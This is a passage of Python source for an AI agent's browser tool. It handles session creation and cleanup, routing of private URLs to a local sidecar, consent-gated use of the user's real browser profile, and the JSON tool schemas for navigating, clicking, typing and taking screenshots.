_cached_headed_mode: Optional[bool] = None
_headed_mode_resolved = False


def _is_headed_mode() -> bool:
    """Return True when the browser should launch in headed (visible) mode.

    Reads ``config["browser"]["headed"]`` with ``AGENT_BROWSER_HEADED`` env
    var as fallback.  Result is cached after the first call.
    """
    global _cached_headed_mode, _headed_mode_resolved
    if _headed_mode_resolved:
        return _cached_headed_mode  # type: ignore[return-value]

    _headed_mode_resolved = True
    _cached_headed_mode = _browser_cfg(
        "headed", False,
        lambda v: False if v is None else str(v).strip().lower() in ("true", "1", "yes"),
        "browser.headed from config",
    )
    if not _cached_headed_mode:
        env_val = os.environ.get("AGENT_BROWSER_HEADED", "").strip()
        if env_val and env_val.lower() in ("true", "1", "yes"):
            _cached_headed_mode = True

    return _cached_headed_mode


def _should_inject_engine(engine: str) -> bool:
    """Return True when the engine flag should be added to agent-browser commands.

    Only inject ``--engine`` for non-cloud, non-camofox local sessions where
    the engine is explicitly set (not ``auto``).
    """
    if engine == "auto":
        return False
    if _is_camofox_mode():
        return False
    return _is_local_mode()


from tools.browser_tool_lightpanda_fallback import (  # noqa: F401
    _using_lightpanda_engine,
    lightpanda_engine_status,
    _lightpanda_fallback_reason,
    _needs_lightpanda_fallback,
    _annotate_lightpanda_fallback,
    _copy_fallback_warning,
    _run_chrome_fallback_command,
    _chrome_fallback_screenshot,
)


def _auto_local_for_private_urls() -> bool:
    """``browser.auto_local_for_private_urls`` (default True), cached for the process.

    When on, ``browser_navigate`` routes private/loopback/LAN URLs to a local
    Chromium sidecar even with a cloud provider configured; public URLs keep
    using the cloud provider in the same conversation.
    """
    global _auto_local_for_private_urls_resolved, _cached_auto_local_for_private_urls
    if _auto_local_for_private_urls_resolved:
        return _cached_auto_local_for_private_urls

    _auto_local_for_private_urls_resolved = True
    _cached_auto_local_for_private_urls = _browser_cfg(
        "auto_local_for_private_urls", _cached_auto_local_for_private_urls, bool,
        "auto_local_for_private_urls from config",
    )
    return _cached_auto_local_for_private_urls


def _use_real_profile() -> bool:
    """Return whether the user consented to real-profile local browsing.

    Reads ``browser.use_real_profile`` (default False) on EVERY call — it is a
    consent switch, so flipping it off must take effect without a restart, and
    in a multiplexed gateway each profile's config must decide for itself.
    The read is one YAML load per local session creation (not per command),
    so there is no hot-path cost to keeping it uncached.
    """
    return _browser_cfg("use_real_profile", False, bool, "use_real_profile from config")


# Session name for the single shared real-profile copy-browser. All consented
# local browsing attaches to this one agent-browser session so concurrent
# tasks reuse the same copy-browser instead of each launching a rival Chromium
# on the same copied user-data-dir.
_REAL_PROFILE_SESSION = "hermes-real-profile"
_real_profile_cdp_lock = threading.Lock()
_real_profile_cdp_cache: dict = {}
_real_profile_chrome_procs: list = []  # Popen handles of directly-launched real browsers


from tools.browser_tool_real_profile import (  # noqa: F401
    _terminate_real_profile_chrome,
    _cdp_http_ready,
    _agent_browser_get_cdp,
    _cdp_on_data_dir,
    _agent_browser_close_session,
    _REAL_PROFILE_CHROME_FLAGS,
    _real_profile_unsupported_reason,
    _real_profile_snapshot_error,
    _launch_real_profile_chrome,
    _attach_agent_browser_to_real_profile,
    _real_profile_cdp,
)


def _agent_browser_argv(browser_cmd: str) -> list:
    """Command prefix to invoke agent-browser (concrete binary or npx sentinel).

    Concrete executable paths stay a single argv item (spaces intact); only the
    synthetic npx sentinel expands. npx is resolved through the same
    PATH + extended-PATH cascade ``_find_agent_browser`` uses — a bare
    ``shutil.which("npx")`` would let a broken system npx shadow a healthy
    Hermes-managed one. If npx isn't found at all (Termux, bare container) the
    bare name is used so Popen raises a readable ``FileNotFoundError: 'npx'``.
    ``--ignore-scripts``: AGENT_BROWSER_NPX_SPEC is a floating range, not an
    exact pin — a compromised future patch must not run install-time scripts.
    """
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        return [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
    return [browser_cmd]


def _prepare_session_socket_dir(session_name: str) -> str:
    """Create the per-session agent-browser socket dir and claim it with our PID.

    Each session gets its own dir so parallel workers don't fight over the
    default socket path ("Failed to create socket directory: Permission
    denied"). The owner_pid file is written BEFORE first use: another hermes
    process's orphan reaper rmtree's any agent-browser-* dir in the shared
    tmpdir that carries no live owner, which would delete this one mid-command.
    """
    socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
    _write_owner_pid(socket_dir, session_name)
    return socket_dir


def _agent_browser_command_env(socket_dir: str) -> Dict[str, str]:
    """Credential-scrubbed env for one agent-browser command.

    Adds the discovery-time PATH fallbacks, the session socket dir, and the
    daemon-side idle self-termination (``AGENT_BROWSER_IDLE_TIMEOUT_MS``,
    agent-browser 0.24+) mirroring the Python-side inactivity janitor —
    unless the user set the idle timeout explicitly.
    """
    env = _build_browser_env()
    env["PATH"] = _merge_browser_path(env.get("PATH", ""))
    env["AGENT_BROWSER_SOCKET_DIR"] = socket_dir
    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in env:
        env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
    return env


def _popen_agent_browser(argv: List[str], env: Dict[str, str], socket_dir: str, tag: str) -> "subprocess.Popen":
    """Spawn agent-browser with stdout/stderr redirected to ``socket_dir/_stdout_<tag>``.

    Temp files instead of pipes: the CLI forks a background daemon that inherits
    its fds, so with pipes ``communicate()`` never sees EOF until the timeout.
    Windows: CREATE_NO_WINDOW only (NOT CREATE_NEW_PROCESS_GROUP, which on
    Python 3.11 cancels asyncio's running loop task and surfaces as
    KeyboardInterrupt in the CLI), STARTF_USESTDHANDLES so CreateProcess hands
    the child ONLY our three handles (leaked parent console handles make the
    Rust binary's daemon grandchild die silently), close_fds=True for the rest.
    Returns the Popen; the caller reads/unlinks the two files.
    """
    stdout_path = os.path.join(socket_dir, f"_stdout_{tag}")
    stderr_path = os.path.join(socket_dir, f"_stderr_{tag}")
    stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    try:
        _popen_extra: dict = {}
        if os.name == "nt":
            _popen_extra["creationflags"] = windows_hide_flags()
            _popen_extra["close_fds"] = True
            _si = subprocess.STARTUPINFO()
            _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
            _popen_extra["startupinfo"] = _si
        return subprocess.Popen(
            argv, stdout=stdout_fd, stderr=stderr_fd,
            stdin=subprocess.DEVNULL, env=env, **_popen_extra,
        )
    finally:
        os.close(stdout_fd)
        os.close(stderr_fd)


def _url_is_private(url: str) -> bool:
    """Return True when the URL's host resolves to a private/LAN/loopback address.

    Reuses ``tools.url_safety.is_safe_url`` as the oracle — if the SSRF check
    would reject the URL, we treat it as "private" for routing purposes.  DNS
    resolution failures are treated as NOT private (fall through to whatever
    backend is configured, which will surface the DNS error naturally).
    """
    try:
        # is_safe_url returns False for private/loopback/link-local/CGNAT AND
        # for DNS failures.  We only want the private-network case here, so
        # we parse + check the host shape as a DNS-failure sieve first.
        from urllib.parse import urlparse
        import ipaddress
        import socket
        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # Literal IP → check directly
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12: only covered by ip.is_private on Python
                # ≥3.11 (bpo-40791).  Explicit check keeps 3.10 runtimes
                # routing these to the local sidecar correctly.
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # Hostname — must resolve to confirm it's private (bare "localhost"
        # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
        # names to avoid a DNS hop.
        if hostname in {"localhost",} or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS fail → not private, let the normal path fail
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip in ipaddress.ip_network("100.64.0.0/10")
            ):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """Pick the session key that should handle ``url`` for ``task_id``.

    Returns ``f"{task_id}::local"`` (hybrid routing: a local Chromium sidecar
    while the cloud session keeps serving public URLs) only when ALL hold: a
    cloud provider is configured, ``browser.auto_local_for_private_urls`` is
    on (default), the URL resolves to a private/LAN/loopback address, no CDP
    override is active (it owns the whole session), and Camofox is off (already
    local-only). Otherwise the bare task_id.
    """
    if task_id is None:
        task_id = "default"
    if _get_cdp_override_raw():
        return task_id
    if _is_camofox_mode():
        return task_id
    if _get_cloud_provider() is None:
        return task_id
    if not _auto_local_for_private_urls():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """Return True when ``session_key`` is a hybrid-routing local sidecar."""
    return session_key.endswith(_LOCAL_SUFFIX)


def _bare_task_id_for_session_key(session_key: str) -> str:
    """Return the owning bare task id for an opaque browser session key."""
    if _is_local_sidecar_key(session_key):
        return session_key[: -len(_LOCAL_SUFFIX)]
    return session_key


def _session_info_owned_by_task(session_info: Dict[str, Any], task_id: str, session_key: str) -> bool:
    """Return whether ``session_info`` still belongs to ``task_id``/``session_key``.

    Sessions created by current code carry explicit ownership metadata. Treat
    older in-memory entries without those fields as valid for hot-reload/test
    compatibility, but reject any explicit mismatch before a non-navigation
    tool can act on the wrong tab/session.
    """
    owner = session_info.get("owner_task_id")
    key = session_info.get("session_key")
    return (owner is None or owner == task_id) and (key is None or key == session_key)


def _last_session_key(task_id: str) -> str:
    """Session key a non-nav tool must use: the one that served the task's last navigation.

    If that session was cleaned up or its ownership metadata no longer matches,
    fail closed by dropping the stale binding rather than recreating or mutating
    the wrong browser.
    """
    if task_id is None:
        task_id = "default"
    recorded_key = _last_active_session_key.get(task_id)
    if not recorded_key:
        return task_id
    with _cleanup_lock:
        session_info = _active_sessions.get(recorded_key)
        if session_info and _session_info_owned_by_task(session_info, task_id, recorded_key):
            return recorded_key
        _last_active_session_key.pop(task_id, None)
    logger.debug(
        "browser session ownership: dropping stale/mismatched last-active binding %s -> %s",
        task_id,
        recorded_key,
    )
    return task_id


def _allow_private_urls() -> bool:
    """Return whether the browser is allowed to navigate to private/internal addresses.

    Reads ``config["browser"]["allow_private_urls"]``. Single-profile calls
    cache the result for the process lifetime; multiplexed profile turns resolve
    their context-local config on each call. Defaults to ``False`` (SSRF
    protection active).
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved

    # The profile multiplexer scopes config with a ContextVar while sharing
    # this module. Never reuse another profile's private-network opt-out.
    if get_hermes_home_override() is not None:
        return _resolve_allow_private_urls()

    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = _resolve_allow_private_urls()
    return _cached_allow_private_urls


def _resolve_allow_private_urls() -> bool:
    """Read the browser private-URL toggle from the active config scope."""
    return _browser_cfg(
        "allow_private_urls", False,
        lambda v: is_truthy_value(v, default=False),
        "allow_private_urls from config",
    )


def _socket_safe_tmpdir() -> str:
    """Short temp dir for Unix domain sockets.

    macOS ``TMPDIR`` (``/var/folders/.../T/``) plus ``agent-browser-hermes_…``
    exceeds the 104-byte ``AF_UNIX`` path limit ("Failed to create socket
    directory", silent screenshot failures), so ``/tmp`` is used there.
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Active sessions keyed by "session key": the bare task_id, or f"{task_id}::local"
# for a hybrid-routing local sidecar. The key is opaque to _run_browser_command /
# cleanup_browser. Values: session_name (always), bb_session_id + cdp_url (cloud).
_active_sessions: Dict[str, Dict[str, Any]] = {}
_recording_sessions: set = set()  # session_keys with active recordings

# Most recent session_key per task_id, set by browser_navigate() and read by every
# non-nav tool so click/snapshot land in the session that served the last
# navigation (otherwise a localhost sidecar task would fall back to the cloud session).
_last_active_session_key: Dict[str, str] = {}
_LOCAL_SUFFIX = "::local"

# Flag to track if cleanup has been done
_cleanup_done = False

# =============================================================================
# Inactivity Timeout Configuration
# =============================================================================

# Session inactivity timeout (seconds) - cleanup if no activity for this long.
# config.yaml is authoritative; BROWSER_INACTIVITY_TIMEOUT remains a legacy
# fallback so old deployments keep working if they have not migrated yet.
DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120)
)


def _get_session_inactivity_timeout() -> int:
    env_default = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
    return _browser_cfg(
        "inactivity_timeout", env_default,
        lambda v: env_default if v is None else max(int(v), 30),  # 30s floor: no instant reaping
        "inactivity_timeout from config",
    )


BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()

# How often the cleanup thread re-runs the orphan reaper (a startup-only reap
# can never recover from a leak that appears after boot in a long-lived process).
BROWSER_ORPHAN_REAP_INTERVAL = 300  # seconds

# Idle ceiling for a daemon whose owner process is alive but which fell out of
# its in-memory tracking — owner-alive alone would make it immortal. A large
# multiple of the inactivity timeout so a legitimately busy session is never touched.
BROWSER_ORPHAN_GRACE_SECONDS = max(3600, BROWSER_SESSION_INACTIVITY_TIMEOUT * 20)

_session_last_activity: Dict[str, float] = {}
# Owner Hermes home per session: the janitor is one process-global thread with
# no profile scope of its own, so each teardown must re-enter the OWNING
# profile's scope (copy_context at spawn would pin the first profile's secrets
# onto every other profile's teardown).
_session_owner_homes: Dict[str, str] = {}
# Consecutive janitor cleanup failures per session; force-reaped after MAX_INACTIVITY_CLEANUP_FAILURES.
_cleanup_failures: Dict[str, int] = {}
MAX_INACTIVITY_CLEANUP_FAILURES = 3

# Session keys flagged suspect after a command timeout. Written by
# _BrowserSessionBackend.mark_suspect (a single GIL-atomic dict write — must stay
# cheap and lock-free per the SuspectableBackend contract); consumed by
# ensure_healthy() at next use, which recycles the session.
_suspect_browser_sessions: Dict[str, str] = {}


class _BrowserSessionBackend:
    """``agent.deadline.SuspectableBackend`` adapter for one cached session key.

    A thin stateless view over ``_active_sessions[key]`` + its daemon. The
    timeout path calls ``mark_suspect`` inline; ``ensure_healthy`` runs at the
    top of ``_get_session_info`` — the single choke point every command passes
    through before reusing a cached session.
    """

    __slots__ = ("_session_key",)

    def __init__(self, session_key: str) -> None:
        self._session_key = session_key

    def mark_suspect(self, reason: str) -> None:
        """Flag the cached session as possibly poisoned.

        MUST stay cheap, non-blocking and lock-free (it runs inline on the
        timed-out caller's thread); all recycle work is deferred to ``ensure_healthy``.
        """
        _suspect_browser_sessions[self._session_key] = reason

    def ensure_healthy(self) -> bool:
        """Recycle the session when a prior timeout marked it suspect.

        True when safe to reuse; False after tearing down a suspect session
        (caller creates a fresh one). The flag is popped BEFORE teardown: the
        ``close`` re-enters ``_get_session_info`` and must not recurse into
        another recycle.
        """
        reason = _suspect_browser_sessions.pop(self._session_key, None)
        if reason is None:
            return True
        logger.info(
            "Recycling suspect browser session %s before reuse (%s)",
            self._session_key, reason,
        )
        try:
            _cleanup_single_browser_session(self._session_key)
        except Exception:
            logger.warning(
                "Teardown of suspect browser session %s failed; a fresh "
                "session will be created anyway", self._session_key,
                exc_info=True,
            )
        return False


def _browser_session_backend(session_key: str) -> _BrowserSessionBackend:
    """Return the SuspectableBackend adapter for ``session_key``."""
    return _BrowserSessionBackend(session_key)

# Background cleanup thread state
_cleanup_thread = None
_cleanup_running = False
# Protects _session_last_activity AND _active_sessions for thread safety
# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()


from tools.browser_tool_lifecycle import (  # noqa: F401  (re-exported; tests patch tools.browser_tool.<name>)
    _session_expiry_timestamp,
    _session_has_expired,
    _emergency_cleanup_all_sessions,
    _session_owner_scope,
    _cleanup_inactive_browser_sessions,
    _write_owner_pid,
    _verify_reapable_browser_daemon,
    _socket_dir_idle_seconds,
    _owner_pid_alive,
    _reap_socket_dir,
    _reap_orphaned_browser_sessions,
    _browser_cleanup_thread_worker,
    _start_browser_cleanup_thread,
    _stop_browser_cleanup_thread,
    _update_session_activity,
    _kill_process_tree,
    _legacy_kill_process_tree,
    _pid_exists,
    _cleanup_old_screenshots,
    _cleanup_old_recordings,
    _drop_last_active_binding,
    cleanup_browser,
    _kill_verified_daemon,
    _release_session_resources,
    _force_reap_browser_session,
    _cleanup_single_browser_session,
    cleanup_all_browsers,
)

# atexit only — NO SIGINT/SIGTERM handlers calling sys.exit(): a SystemExit
# raised inside a prompt_toolkit key-binding callback corrupts the coroutine
# state and makes the process unkillable. atexit runs on any normal exit.
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity Cleanup Functions
# =============================================================================


# Register cleanup thread stop on exit
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# Tool Schemas
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 15000 chars are truncated or LLM-summarized; when that happens the complete snapshot is saved to a file and the output includes its path so you can page through the rest with read_file. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise Hermes falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, clear the message buffers after reading"
                },
                "expression": {
                    "type": "string",
                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                }
            },
            "required": []
        }
    },
]


# ============================================================================
# Utility Functions
# ============================================================================

def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict[str, str]:
    import uuid

    # Real-profile consent: attach this local session (via CDP) to the user's
    # browser running on a hermes-owned SNAPSHOT of their real profile, logins
    # included. Fail closed on resolver/launch errors — a consented user must
    # never be silently downgraded to a throwaway. The hybrid private-URL
    # sidecar passes allow_real_profile=False: handing the user's cookie jar to
    # an arbitrary internal host the model chose is a larger, unconsented
    # exposure than the routing rule protects against (and a real-profile
    # failure must not break private-URL routing).
    if allow_real_profile:
        cdp_url, err = _real_profile_cdp()
        if err:
            raise RuntimeError(err)
        if cdp_url:
            session_name = f"rp_{uuid.uuid4().hex[:10]}"
            logger.info(
                "Created real-profile local session %s for task %s", session_name, task_id
            )
            return {
                "session_name": session_name,
                "bb_session_id": None,
                "cdp_url": _resolve_cdp_override(cdp_url),
                "features": {"local": True, "real_profile": True},
            }

    # Browser Use mode drives whatever CDP endpoint it is handed; with
    # ``browser.engine: lightpanda`` that endpoint is a Hermes-spawned
    # ``lightpanda serve``. The built-in tools never reach this branch —
    # they are hidden in Browser Use mode — and keep driving Lightpanda via
    # ``agent-browser --engine lightpanda`` on the plain local session below.
    if _is_browser_use_cli_mode() and _using_lightpanda_engine():
        return _create_lightpanda_session(task_id)

    session_name = f"h_{uuid.uuid4().hex[:10]}"
    logger.info("Created local browser session %s for task %s",
                session_name, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_lightpanda_session(task_id: str) -> Dict[str, Any]:
    """Spawn ``lightpanda serve`` for this session key (Browser Use mode)."""
    import uuid
    from tools.browser_lightpanda import launch_lightpanda

    session_name = f"lp_{uuid.uuid4().hex[:10]}"
    server, err = launch_lightpanda(
        session_name, block_private_networks=not _is_local_backend()
    )
    if err:
        raise RuntimeError(err)
    logger.info(
        "Created Lightpanda session %s (port %s) for task %s",
        session_name, server.port, task_id,
    )
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": server.cdp_url,
        "features": {"local": True, "lightpanda": True},
    }


def _local_backend_process_dead(session_info: Dict[str, Any]) -> bool:
    """True for a Lightpanda session whose ``lightpanda serve`` is gone."""
    if not (session_info.get("features") or {}).get("lightpanda"):
        return False
    from tools.browser_lightpanda import get_server

    server = get_server(session_info.get("session_name", ""))
    return server is None or not server.is_alive()


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """Create a session that connects to a user-supplied CDP endpoint."""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, _sanitize_url_for_logs(cdp_url), task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _create_cloud_session_or_fallback(task_id: str, provider) -> Dict[str, Any]:
    """Create a cloud session; fall back to local Chromium (marked degraded) on failure.

    Some cloud providers (Browser-Use v3) return an HTTP CDP discovery URL
    instead of a raw websocket endpoint, so ``cdp_url`` is resolved here.
    """
    try:
        session_info = provider.create_session(task_id)
        if not session_info or not isinstance(session_info, dict):
            raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
        if session_info.get("cdp_url"):
            session_info = dict(session_info)
            session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
        return session_info
    except Exception as e:
        provider_name = type(provider).__name__
        logger.warning(
            "Cloud provider %s failed (%s); attempting fallback to local "
            "Chromium for task %s",
            provider_name, e, task_id,
            exc_info=True,
        )
        try:
            session_info = _create_local_session(task_id)
        except Exception as local_error:
            raise RuntimeError(
                f"Cloud provider {provider_name} failed ({e}) and local "
                f"fallback also failed ({local_error})"
            ) from e
        # Mark session as degraded for observability
        if isinstance(session_info, dict):
            session_info = dict(session_info)
            session_info["fallback_from_cloud"] = True
            session_info["fallback_reason"] = str(e)
            session_info["fallback_provider"] = provider_name
        return session_info


def _create_session_for_key(task_id: str, force_local: bool) -> Dict[str, Any]:
    """Create a fresh session for ``task_id`` (runs OUTSIDE the lock: cloud mode makes a network call).

    Precedence: CDP override > hybrid local sidecar > cloud provider > local.
    The hybrid private-URL sidecar NEVER gets the real profile — presenting real
    cookies to an arbitrary LAN host the model routed there is unconsented
    exposure (see ``_create_local_session``).
    """
    cdp_override = _get_cdp_override()
    if cdp_override and not force_local:
        return _create_cdp_session(task_id, cdp_override)
    if force_local:
        return _create_local_session(task_id, allow_real_profile=False)
    provider = _get_cloud_provider()
    if provider is None:
        return _create_local_session(task_id)
    return _create_cloud_session_or_fallback(task_id, provider)
def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
    """Get or create session info for a session key (thread-safe).

    ``task_id`` may carry the ``::local`` suffix (hybrid local sidecar), which
    forces a local Chromium even when a cloud provider is configured. Also
    starts the inactivity cleanup thread and touches activity tracking.
    Returns a dict with ``session_name`` (always) plus ``bb_session_id`` /
    ``cdp_url`` for cloud sessions.
    """
    if task_id is None:
        task_id = "default"

    # Start the cleanup thread if not running (handles inactivity timeouts)
    _start_browser_cleanup_thread()

    # Update activity timestamp for this session
    _update_session_activity(task_id)

    with _cleanup_lock:
        # Check if we already have a session for this task
        existing_session = _active_sessions.get(task_id)

    # Suspect-session recycle: a previous command
    # timeout marked this cached session suspect via the SuspectableBackend
    # adapter.  ensure_healthy() tears it down here, at next use, and we fall
    # through to create a fresh session — the expensive recycle lives on this
    # path, not on the timeout path (mark must stay cheap).
    if existing_session is not None and not _browser_session_backend(task_id).ensure_healthy():
        # Teardown removes the activity entry; the replacement must be
        # tracked by the inactivity reaper like an initial session.
        _update_session_activity(task_id)
        with _cleanup_lock:
            replacement = _active_sessions.get(task_id)
        if replacement is not None and replacement is not existing_session:
            # Another thread already recycled and re-created it.
            return replacement
        existing_session = None

    if existing_session is not None:
        if (
            not _session_has_expired(existing_session)
            and not _local_backend_process_dead(existing_session)
        ):
            return existing_session

        logger.info(
            "Replacing expired or dead browser session for task %s",
            task_id,
        )
        _cleanup_single_browser_session(task_id)
        # Cleanup removes the activity entry. The replacement session must be
        # tracked by the inactivity reaper just like an initial session.
        _update_session_activity(task_id)

        # Guard against a concurrent replacement: another thread may have
        # already cleaned up the expired session and created a fresh one
        # while we were waiting.  If so, return the live replacement instead
        # of falling through to create yet another session.
        with _cleanup_lock:
            replacement = _active_sessions.get(task_id)
        if replacement is not None and replacement is not existing_session:
            return replacement

    # Hybrid routing: session keys ending with ``::local`` force a local
    # Chromium regardless of the globally-configured cloud provider.  Public
    # URLs in the same conversation continue to use the cloud session under
    # the bare task_id key.
    force_local = _is_local_sidecar_key(task_id)
    session_info = _create_session_for_key(task_id, force_local)

    with _cleanup_lock:
        # Double-check: another thread may have created a session while we
        # were doing the network call. Use the existing one to avoid leaking
        # orphan cloud sessions.
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        session_info = dict(session_info)
        session_info.setdefault("session_key", task_id)
        session_info.setdefault("owner_task_id", _bare_task_id_for_session_key(task_id))
        _active_sessions[task_id] = session_info
        # A brand-new session is healthy by definition — drop any stale
        # suspect flag left by a wedged-path eviction of its predecessor.
        _suspect_browser_sessions.pop(task_id, None)

    # Lazy-start the CDP supervisor now that the session exists (if the
    # backend surfaces a CDP URL via override or session_info["cdp_url"]).
    # Idempotent; swallows errors. See _ensure_cdp_supervisor for details.
    # Skip for local sidecars — they have no CDP URL — and for Lightpanda
    # sessions: those only exist in Browser Use mode, where the browser_*
    # tools that consume supervisor state are hidden, so the supervisor
